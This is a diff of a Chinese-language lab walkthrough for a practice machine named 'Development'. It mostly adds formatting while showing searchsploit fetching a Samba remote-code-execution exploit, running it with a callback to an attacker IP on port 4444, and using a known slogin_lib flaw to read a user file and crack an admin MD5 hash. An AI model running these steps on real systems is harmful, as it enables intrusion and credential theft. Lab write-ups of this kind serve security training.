@@ -182,6 +182,7 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 
 ```
 先尝试几个linux的RCE
+```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
 └─$ searchsploit -m linux/remote/37834.py  
   Exploit: Samba 3.5.11/3.6.3 - Remote Code Execution
@@ -190,6 +191,7 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 File Type: Python script, ASCII text executable, with CRLF line terminators
 
 Copied to: /home/aacai/Desktop/192.168.146.74/37834.py
+```
 
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
@@ -204,7 +206,6 @@ Copied to: /home/aacai/Desktop/192.168.146.74/37834.py
     01) samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)
     02) target_finder (hardcode correct system addr)
 
-                                                                                
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
 └─$ python2 37834.py 192.168.146.74 139 192.168.146.63 4444 01            255 ⨯
 {+} TRYING EIP=0x00000b20 OFFSET=0x000011d0Traceback (most recent call last):
@@ -306,18 +307,26 @@ Task Completed
 
 ```
 竟然扫不出来...
+<br>
 后来发现我用dirsearch一扫.. 这个web服务就down了
+<br>
 不知道是我的问题还是这个机器的问题
+<br>
 关注一下页面上的信息
 ![IMG](../FILES/Development/img-20220714124045.png)
+<br>
 这里说明了有很多项目在html_pages这个目录里面, 访问一下
 
 ![IMG](../FILES/Development/img-20220714124121.png)
+<br>
 竟然能直接看到系统文件
+<br>
 看一下主页的源代码
 
 ![IMG](../FILES/Development/img-20220714124219.png)
+<br>
 这里提示让我们找一个development.html的文件, 这不就是刚刚我们在html_pages里面看到的嘛
+<br>
 走着
 
 ![IMG](../FILES/Development/img-20220714124258.png)
@@ -337,18 +346,24 @@ Task Completed
 然后就直接报错了
 
 ![IMG](../FILES/Development/img-20220714124730.png)
+<br>
 这里有一个slogin_lib.inc.php报错了, 那我们去google看看有没有相关信息
 
 头一个就是个exploit...
+<br>
 ![IMG](../FILES/Development/img-20220714125022.png)
 查看一下exploit的内容
 
 ![IMG](../FILES/Development/img-20220714125116.png)
+<br>
 这里面写到有一个RCE和一个slog_users.txt的文件
+<br>
 先看看这个txt文件里面有什么
 
-....拿到管理员密码
+...拿到管理员密码
+<br>
 ![IMG](../FILES/Development/img-20220714125321.png)
+<br>
 丢去破解一下md5试试
 
 ```
